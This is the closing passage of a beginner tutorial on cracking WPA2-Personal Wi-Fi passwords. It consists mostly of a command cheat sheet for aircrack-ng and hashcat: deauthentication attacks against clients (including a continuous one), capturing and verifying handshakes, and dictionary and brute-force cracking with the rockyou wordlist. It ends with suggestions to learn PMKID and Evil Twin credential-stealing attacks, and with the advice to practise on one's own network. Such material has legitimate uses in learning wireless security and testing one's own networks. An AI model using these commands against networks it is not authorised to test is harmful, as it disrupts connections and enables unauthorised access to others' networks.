sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c FF:EE:... wlan0mon  # Specific client
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon          # Continuous (Ctrl+C to stop)

# ===== VERIFY HANDSHAKE =====
aircrack-ng capture-01.cap

# ===== CRACK (dictionary) =====
# Kali default rockyou location:
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
# Custom wordlist:
aircrack-ng -w custom.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# ===== CRACK (incremental brute force) =====
aircrack-ng -w - -b AA:BB:CC:DD:EE:FF capture-01.cap

# ===== ADVANCED (hashcat) =====
hcxpcapngtool capture-01.cap -o capture.hc22000
hashcat -m 22000 capture.hc22000 -a 0 /usr/share/wordlists/rockyou.txt

# ===== CLEAN UP =====
sudo airmon-ng stop wlan0mon     # Go back to normal mode
rm capture-*.cap                  # Delete capture files
```

---

## <a name="next-steps"></a>Next Steps to Learn More

This tutorial covered the basics of WPA2-Personal (PSK) cracking using aircrack-ng. Here's where to go next:

### Beginner next steps
- **Try it on your own network** — the best way to learn is on a network you own
- **Read the aircrack-ng documentation** at https://www.aircrack-ng.org/documentation.html
- **Learn about PMKID attacks** — a more advanced technique that captures a handshake without needing a deauth attack (uses `hcxdumptool` + `hcxpcapngtool`)

### Intermediate next steps
- **WPA3-SAE attacks** — understanding how WPA3's replacement handshake works and its vulnerabilities
- **Evil Twin attacks** — creating a fake WiFi AP that mimics a legitimate one to steal credentials
- **Hashcat rules and masks** — creating more sophisticated password guesses (e.g., appending years to common words: `password2026`)
- **Wi-Fi packet analysis with Wireshark** — understanding exactly what's in each captured packet

### Resources
- **Aircrack-ng official site** — https://www.aircrack-ng.org/
- **SecLists wordlists** — https://github.com/danielmiessler/SecLists
- **Wi-Fi security best practices** — https://www.wi-fi.org/wfa-resources/wi-fi-security
- **WiFi Password testing (legal)** — https://www.kali.org/tools/aircrack-ng/

---

*Last updated: July 2026*
*Aircrack-ng version: 1.7 (current stable)*
*Target audience: Absolute beginners*
